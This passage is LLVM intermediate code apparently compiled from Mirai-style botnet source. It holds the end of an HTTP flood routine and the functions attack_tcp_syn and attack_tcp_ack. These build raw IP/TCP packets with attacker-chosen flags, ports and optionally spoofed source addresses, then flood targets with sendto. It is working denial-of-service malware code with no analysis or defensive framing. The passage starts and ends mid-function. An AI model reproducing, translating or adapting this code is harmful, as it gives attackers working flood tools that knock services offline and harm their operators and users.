  %828 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 6, i64 1
  call void @util_zero(i8* %828, i32 255)
  %829 = load i32, i32* %5, align 4
  %830 = add nsw i32 %829, 1
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds i8, i8* %776, i64 %831
  %833 = call i32 @util_strlen(i8* %832)
  %834 = icmp sgt i32 %833, 0
  br i1 %834, label %835, label %837

; <label>:835:                                    ; preds = %827
  %836 = call i32 @util_strcpy(i8* %828, i8* %832)
  br label %837

; <label>:837:                                    ; preds = %818, %827, %835, %821, %801, %816, %808
  %838 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 9, i64 0
  %839 = bitcast i8* %838 to i32*
  store i32 5522759, i32* %839, align 1
  store i8 10, i8* %429, align 4
  br label %.loopexit617

; <label>:840:                                    ; preds = %.critedge, %703, %699
  %841 = call i32 @util_memsearch(i8* nonnull %21, i32 %443, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %842 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 9, i64 0
  %843 = call signext i8 @util_strcmp(i8* %842, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0))
  %844 = icmp eq i8 %843, 0
  br i1 %844, label %845, label %850

; <label>:845:                                    ; preds = %840
  %846 = call signext i8 @util_strcmp(i8* %842, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %847 = icmp eq i8 %846, 0
  br i1 %847, label %848, label %850

; <label>:848:                                    ; preds = %845
  %849 = icmp sgt i32 %443, %841
  %.sink13 = select i1 %849, i8 10, i8 1
  br label %850

; <label>:850:                                    ; preds = %840, %845, %848
  %storemerge562 = phi i8 [ %.sink13, %848 ], [ 7, %845 ], [ 7, %840 ]
  store i8 %storemerge562, i8* %429, align 4
  %851 = load i32, i32* %392, align 4
  %852 = sext i32 %841 to i64
  %853 = call i64 @recv(i32 %851, i8* nonnull %21, i64 %852, i32 16384) #10
  br label %.loopexit617

; <label>:854:                                    ; preds = %.preheader616, %.backedge
  %855 = load i32, i32* %431, align 4
  %856 = icmp eq i32 %855, 1024
  br i1 %856, label %857, label %860

; <label>:857:                                    ; preds = %854
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %432, i8* nonnull %433, i64 960, i32 1, i1 false)
  %858 = load i32, i32* %431, align 4
  %859 = add nsw i32 %858, -64
  store i32 %859, i32* %431, align 4
  br label %860

; <label>:860:                                    ; preds = %857, %854
  %861 = tail call i32* @__errno_location() #11
  store i32 0, i32* %861, align 4
  %862 = load i32, i32* %392, align 4
  %863 = load i32, i32* %431, align 4
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 18, i64 %864
  %866 = sub nsw i32 1024, %863
  %867 = sext i32 %866 to i64
  %868 = call i64 @recv(i32 %862, i8* %865, i64 %867, i32 16384) #10
  %869 = trunc i64 %868 to i32
  switch i32 %869, label %875 [
    i32 0, label %.thread601
    i32 -1, label %870
  ]

.thread601:                                       ; preds = %860
  store i32 104, i32* %861, align 4
  br label %872

; <label>:870:                                    ; preds = %860
  %.pr600 = load i32, i32* %861, align 4
  %871 = icmp eq i32 %.pr600, 11
  br i1 %871, label %.loopexit617, label %872

; <label>:872:                                    ; preds = %.thread601, %870
  %873 = load i32, i32* %392, align 4
  %874 = call i32 @close(i32 %873) #10
  store i32 -1, i32* %392, align 4
  store i8 0, i8* %429, align 4
  br label %.loopexit617

; <label>:875:                                    ; preds = %860
  %876 = load i32, i32* %431, align 4
  %877 = add nsw i32 %876, %869
  store i32 %877, i32* %431, align 4
  store i32 %390, i32* %435, align 4
  br label %878

; <label>:878:                                    ; preds = %975, %875
  %879 = load i32, i32* %436, align 4
  %880 = icmp sgt i32 %879, 0
  br i1 %880, label %881, label %943

; <label>:881:                                    ; preds = %878
  %882 = load i32, i32* %431, align 4
  %883 = icmp sgt i32 %879, %882
  %.sink14 = select i1 %883, i32* %431, i32* %436
  %884 = load i32, i32* %.sink14, align 4
  %885 = sub nsw i32 %879, %884
  store i32 %885, i32* %436, align 4
  %886 = load i32, i32* %437, align 4
  %887 = icmp eq i32 %886, 1
  br i1 %887, label %888, label %943

; <label>:888:                                    ; preds = %881
  %889 = load i32, i32* %431, align 4
  %890 = call i8* @table_retrieve_val(i32 61, i32* null)
  %891 = call i32 @util_memsearch(i8* nonnull %434, i32 %889, i8* %890, i32 11)
  %892 = icmp eq i32 %891, -1
  br i1 %892, label %thread-pre-split593, label %893

; <label>:893:                                    ; preds = %888
  %894 = load i32, i32* %431, align 4
  %895 = call i8* @table_retrieve_val(i32 61, i32* null)
  %896 = call i32 @util_memsearch(i8* nonnull %434, i32 %894, i8* %895, i32 11)
  %897 = sext i32 %896 to i64
  %898 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 18, i64 %897
  %899 = load i32, i32* %431, align 4
  %900 = sub nsw i32 %899, %896
  %901 = call i32 @util_memsearch(i8* %898, i32 %900, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %902 = add i32 %896, -1
  %903 = add i32 %902, %901
  %904 = sext i32 %903 to i64
  %905 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 18, i64 %904
  store i8 0, i8* %905, align 1
  %906 = load i32, i32* %439, align 4
  %907 = icmp slt i32 %906, 5
  br i1 %907, label %908, label %942

; <label>:908:                                    ; preds = %893
  %909 = call i32 @util_strlen(i8* %898)
  %910 = icmp slt i32 %909, 128
  br i1 %910, label %911, label %942

; <label>:911:                                    ; preds = %908
  %912 = sext i32 %906 to i64
  %913 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 16, i64 %912, i64 0
  %914 = call i32 @util_strcpy(i8* %913, i8* %898)
  %915 = load i32, i32* %439, align 4
  %916 = sext i32 %915 to i64
  %917 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 16, i64 %916, i64 0
  %918 = call i32 @util_strlen(i8* %917)
  %919 = sext i32 %918 to i64
  %920 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 16, i64 %916, i64 %919
  %921 = call i32 @util_strcpy(i8* %920, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  %922 = add i32 %896, 3
  %923 = add i32 %922, %901
  %924 = sext i32 %923 to i64
  %925 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 18, i64 %924
  %926 = load i32, i32* %431, align 4
  %927 = sub nsw i32 %926, %923
  %928 = call i32 @util_memsearch(i8* %925, i32 %927, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %929 = add i32 %923, -1
  %930 = add i32 %929, %928
  %931 = sext i32 %930 to i64
  %932 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 18, i64 %931
  store i8 0, i8* %932, align 1
  %933 = load i32, i32* %439, align 4
  %934 = sext i32 %933 to i64
  %935 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 16, i64 %934, i64 0
  %936 = call i32 @util_strlen(i8* %935)
  %937 = sext i32 %936 to i64
  %938 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 16, i64 %934, i64 %937
  %939 = call i32 @util_strcpy(i8* %938, i8* %925)
  %940 = load i32, i32* %439, align 4
  %941 = add nsw i32 %940, 1
  store i32 %941, i32* %439, align 4
  br label %942

; <label>:942:                                    ; preds = %911, %908, %893
  store i32 -1, i32* %436, align 4
  store i8 10, i8* %429, align 4
  br label %.loopexit617

thread-pre-split593:                              ; preds = %888
  %.pr594 = load i32, i32* %436, align 4
  br label %943

; <label>:943:                                    ; preds = %thread-pre-split593, %881, %878
  %944 = phi i32 [ %.pr594, %thread-pre-split593 ], [ %885, %881 ], [ %879, %878 ]
  %.0542 = phi i32 [ %884, %thread-pre-split593 ], [ %884, %881 ], [ 0, %878 ]
  %945 = icmp eq i32 %944, 0
  br i1 %945, label %946, label %973

; <label>:946:                                    ; preds = %943
  %947 = load i32, i32* %438, align 4
  %948 = icmp eq i32 %947, 1
  %949 = load i32, i32* %431, align 4
  br i1 %948, label %950, label %968

; <label>:950:                                    ; preds = %946
  %951 = call i32 @util_memsearch(i8* nonnull %434, i32 %949, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %952 = icmp eq i32 %951, -1
  br i1 %952, label %973, label %953

; <label>:953:                                    ; preds = %950
  %954 = add nsw i32 %951, -2
  %955 = sext i32 %954 to i64
  %956 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 18, i64 %955
  store i8 0, i8* %956, align 1
  %957 = call i32 @util_memsearch(i8* nonnull %434, i32 %951, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %958 = icmp eq i32 %957, -1
  br i1 %958, label %962, label %959

; <label>:959:                                    ; preds = %953
  %960 = sext i32 %957 to i64
  %961 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 18, i64 %960
  store i8 0, i8* %961, align 1
  br label %962

; <label>:962:                                    ; preds = %953, %959
  %963 = call i32 @util_atoi(i8* nonnull %434, i32 16)
  %964 = icmp eq i32 %963, 0
  br i1 %964, label %965, label %966

; <label>:965:                                    ; preds = %962
  store i8 1, i8* %429, align 4
  br label %.loopexit617

; <label>:966:                                    ; preds = %962
  %967 = add nsw i32 %963, 2
  store i32 %967, i32* %436, align 4
  br label %973

; <label>:968:                                    ; preds = %946
  %969 = sub nsw i32 %949, %.0542
  store i32 %969, i32* %436, align 4
  %970 = icmp eq i32 %969, 0
  br i1 %970, label %971, label %973

; <label>:971:                                    ; preds = %968
  store i8 1, i8* %429, align 4
  br label %.loopexit617

.backedge:                                        ; preds = %973, %975
  %.pr = load i8, i8* %429, align 4
  %972 = icmp eq i8 %.pr, 7
  br i1 %972, label %854, label %.loopexit617.loopexit

; <label>:973:                                    ; preds = %950, %966, %968, %943
  %.1543 = phi i32 [ %951, %966 ], [ %.0542, %950 ], [ %.0542, %968 ], [ %.0542, %943 ]
  %974 = icmp eq i32 %.1543, 0
  br i1 %974, label %.backedge, label %975

; <label>:975:                                    ; preds = %973
  %976 = load i32, i32* %431, align 4
  %977 = sub nsw i32 %976, %.1543
  store i32 %977, i32* %431, align 4
  %978 = sext i32 %.1543 to i64
  %979 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 18, i64 %978
  %980 = sext i32 %977 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %434, i8* %979, i64 %980, i32 1, i1 false)
  %981 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 18, i64 %980
  store i8 0, i8* %981, align 1
  %982 = load i32, i32* %431, align 4
  %983 = icmp eq i32 %982, 0
  br i1 %983, label %.backedge, label %878

.preheader618:                                    ; preds = %.preheader618.preheader, %.preheader618
  %984 = tail call i32* @__errno_location() #11
  store i32 0, i32* %984, align 4
  %985 = load i32, i32* %392, align 4
  %986 = call i64 @recv(i32 %985, i8* nonnull %21, i64 10240, i32 16384) #10
  %987 = trunc i64 %986 to i32
  switch i32 %987, label %.preheader618 [
    i32 0, label %.thread604
    i32 -1, label %988
  ]

.thread604:                                       ; preds = %.preheader618
  store i32 104, i32* %984, align 4
  br label %.thread598

; <label>:988:                                    ; preds = %.preheader618
  %.pr603 = load i32, i32* %984, align 4
  %989 = icmp eq i32 %.pr603, 11
  br i1 %989, label %992, label %.thread598

.thread598:                                       ; preds = %988, %.thread604
  %990 = load i32, i32* %392, align 4
  %991 = call i32 @close(i32 %990) #10
  store i32 -1, i32* %392, align 4
  store i8 0, i8* %429, align 4
  br label %.loopexit617

; <label>:992:                                    ; preds = %988
  %.pr597 = load i8, i8* %429, align 4
  %993 = icmp eq i8 %.pr597, 0
  br i1 %993, label %.loopexit617, label %994

; <label>:994:                                    ; preds = %992
  store i8 1, i8* %429, align 4
  br label %.loopexit617

.loopexit617.loopexit:                            ; preds = %.backedge
  br label %.loopexit617

.loopexit617:                                     ; preds = %.loopexit617.loopexit, %971, %965, %942, %.thread598, %428, %870, %992, %417, %872, %994, %850, %448, %.lr.ph664, %837, %698, %445, %413
  %indvars.iv.next697 = add nuw nsw i64 %indvars.iv696, 1
  %995 = icmp slt i64 %indvars.iv.next697, %69
  br i1 %995, label %.lr.ph664, label %.backedge622.loopexit

; <label>:996:                                    ; preds = %30, %27, %24, %4
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %196, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %66, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %.promoted = load i32, i32* %5, align 4
  %64 = sext i32 %.promoted to i64
  %65 = zext i8 %0 to i64
  br label %80

; <label>:66:                                     ; preds = %39
  %67 = call i32 @close(i32 %37) #10
  br label %196

..preheader_crit_edge:                            ; preds = %97
  %68 = trunc i64 %indvars.iv.next to i32
  store i32 %68, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %69 = icmp eq i8 %0, 0
  %70 = icmp eq i32 %36, -1
  %71 = and i32 %11, 65535
  %72 = icmp eq i32 %71, 65535
  %73 = and i32 %17, 65535
  %74 = icmp eq i32 %73, 65535
  %75 = and i32 %19, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = icmp eq i32 %21, 65535
  %78 = icmp eq i32 %22, 65535
  %79 = icmp eq i8 %24, 0
  br label %.loopexit

; <label>:80:                                     ; preds = %.lr.ph130, %97
  %indvars.iv = phi i64 [ %64, %.lr.ph130 ], [ %indvars.iv.next, %97 ]
  %81 = call noalias i8* @calloc(i64 128, i64 1) #10
  %82 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %81, i8** %82, align 8
  %83 = getelementptr inbounds i8, i8* %81, i64 20
  %84 = getelementptr inbounds i8, i8* %81, i64 40
  store i8 69, i8* %81, align 4
  %85 = getelementptr inbounds i8, i8* %81, i64 1
  store i8 %10, i8* %85, align 1
  %86 = call zeroext i16 @htons(i16 zeroext 60) #11
  %87 = getelementptr inbounds i8, i8* %81, i64 2
  %88 = bitcast i8* %87 to i16*
  store i16 %86, i16* %88, align 2
  %89 = call zeroext i16 @htons(i16 zeroext %12) #11
  %90 = getelementptr inbounds i8, i8* %81, i64 4
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 4
  %92 = getelementptr inbounds i8, i8* %81, i64 8
  store i8 %14, i8* %92, align 4
  br i1 %45, label %97, label %93

; <label>:93:                                     ; preds = %80
  %94 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %95 = getelementptr inbounds i8, i8* %81, i64 6
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  br label %97

; <label>:97:                                     ; preds = %80, %93
  %98 = getelementptr inbounds i8, i8* %81, i64 9
  store i8 6, i8* %98, align 1
  %99 = getelementptr inbounds i8, i8* %81, i64 12
  %100 = bitcast i8* %99 to i32*
  store i32 %36, i32* %100, align 4
  %101 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %102 = load i32, i32* %101, align 4
  %103 = getelementptr inbounds i8, i8* %81, i64 16
  %104 = bitcast i8* %103 to i32*
  store i32 %102, i32* %104, align 4
  %105 = call zeroext i16 @htons(i16 zeroext %18) #11
  %106 = bitcast i8* %83 to i16*
  store i16 %105, i16* %106, align 4
  %107 = call zeroext i16 @htons(i16 zeroext %20) #11
  %108 = getelementptr inbounds i8, i8* %81, i64 22
  %109 = bitcast i8* %108 to i16*
  store i16 %107, i16* %109, align 2
  %110 = call zeroext i16 @htons(i16 zeroext %46) #11
  %111 = zext i16 %110 to i32
  %112 = getelementptr inbounds i8, i8* %81, i64 24
  %113 = bitcast i8* %112 to i32*
  store i32 %111, i32* %113, align 4
  %114 = getelementptr inbounds i8, i8* %81, i64 32
  %115 = bitcast i8* %114 to i16*
  %116 = load i16, i16* %115, align 4
  %117 = and i16 %116, -16369
  %118 = or i16 %63, %117
  %119 = or i16 %118, 160
  store i16 %119, i16* %115, align 4
  %120 = getelementptr inbounds i8, i8* %81, i64 41
  store i8 2, i8* %84, align 1
  %121 = getelementptr inbounds i8, i8* %81, i64 42
  store i8 4, i8* %120, align 1
  %122 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %123 = bitcast i8* %121 to i16*
  store i16 %122, i16* %123, align 2
  %124 = getelementptr inbounds i8, i8* %81, i64 44
  %125 = getelementptr inbounds i8, i8* %81, i64 45
  store i8 4, i8* %124, align 1
  %126 = getelementptr inbounds i8, i8* %81, i64 46
  store i8 2, i8* %125, align 1
  %127 = getelementptr inbounds i8, i8* %81, i64 47
  store i8 8, i8* %126, align 1
  store i8 10, i8* %127, align 1
  %128 = getelementptr inbounds i8, i8* %81, i64 56
  %129 = getelementptr inbounds i8, i8* %81, i64 57
  store i8 1, i8* %128, align 1
  %130 = getelementptr inbounds i8, i8* %81, i64 58
  store i8 3, i8* %129, align 1
  %131 = getelementptr inbounds i8, i8* %81, i64 59
  store i8 3, i8* %130, align 1
  store i8 6, i8* %131, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %132 = icmp slt i64 %indvars.iv.next, %65
  br i1 %132, label %80, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %175
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %69, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %175
  %storemerge122129 = phi i32 [ %194, %175 ], [ 0, %.lr.ph.preheader ]
  %133 = sext i32 %storemerge122129 to i64
  %134 = getelementptr inbounds i8*, i8** %8, i64 %133
  %135 = load i8*, i8** %134, align 8
  %136 = bitcast i8* %135 to %struct.iphdr*
  %137 = getelementptr inbounds i8, i8* %135, i64 20
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %133, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = icmp ult i8 %139, 32
  br i1 %140, label %141, label %148

; <label>:141:                                    ; preds = %.lr.ph
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %133, i32 1
  %143 = load i32, i32* %142, align 4
  %144 = call i32 @ntohl(i32 %143) #11
  %145 = call i32 @htonl(i32 %144) #11
  %146 = getelementptr inbounds i8, i8* %135, i64 16
  %147 = bitcast i8* %146 to i32*
  store i32 %145, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %141, %.lr.ph
  br i1 %70, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %135, i64 12
  %151 = bitcast i8* %150 to i32*
  store i32 0, i32* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %72, label %153, label %156

; <label>:153:                                    ; preds = %152
  %154 = getelementptr inbounds i8, i8* %135, i64 4
  %155 = bitcast i8* %154 to i16*
  store i16 0, i16* %155, align 4
  br label %156

; <label>:156:                                    ; preds = %153, %152
  br i1 %74, label %157, label %159

; <label>:157:                                    ; preds = %156
  %158 = bitcast i8* %137 to i16*
  store i16 0, i16* %158, align 4
  br label %159

; <label>:159:                                    ; preds = %157, %156
  br i1 %76, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %135, i64 22
  %162 = bitcast i8* %161 to i16*
  store i16 0, i16* %162, align 2
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %77, label %164, label %167

; <label>:164:                                    ; preds = %163
  %165 = getelementptr inbounds i8, i8* %135, i64 24
  %166 = bitcast i8* %165 to i32*
  store i32 0, i32* %166, align 4
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br i1 %78, label %168, label %171

; <label>:168:                                    ; preds = %167
  %169 = getelementptr inbounds i8, i8* %135, i64 28
  %170 = bitcast i8* %169 to i32*
  store i32 0, i32* %170, align 4
  br label %171

; <label>:171:                                    ; preds = %168, %167
  br i1 %79, label %175, label %172

; <label>:172:                                    ; preds = %171
  %173 = getelementptr inbounds i8, i8* %135, i64 38
  %174 = bitcast i8* %173 to i16*
  store i16 0, i16* %174, align 2
  br label %175

; <label>:175:                                    ; preds = %171, %172
  %176 = getelementptr inbounds i8, i8* %135, i64 10
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 2
  %178 = bitcast i8* %135 to i16*
  %179 = call zeroext i16 @checksum_generic(i16* %178, i32 20)
  store i16 %179, i16* %177, align 2
  %180 = getelementptr inbounds i8, i8* %135, i64 36
  %181 = bitcast i8* %180 to i16*
  store i16 0, i16* %181, align 4
  %182 = call zeroext i16 @htons(i16 zeroext 40) #11
  %183 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %136, i8* %137, i16 zeroext %182, i32 40)
  store i16 %183, i16* %181, align 4
  %184 = getelementptr inbounds i8, i8* %135, i64 22
  %185 = bitcast i8* %184 to i16*
  %186 = load i16, i16* %185, align 2
  %187 = load i32, i32* %5, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %188, i32 0, i32 1
  store i16 %186, i16* %189, align 2
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %188, i32 0
  %191 = bitcast %struct.sockaddr_in* %190 to %struct.sockaddr*
  %192 = call i64 @sendto(i32 %37, i8* %135, i64 60, i32 16384, %struct.sockaddr* %191, i32 16) #10
  %193 = load i32, i32* %5, align 4
  %194 = add nsw i32 %193, 1
  store i32 %194, i32* %5, align 4
  %195 = icmp slt i32 %194, %43
  br i1 %195, label %.lr.ph, label %.loopexit.loopexit

; <label>:196:                                    ; preds = %4, %66
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i8
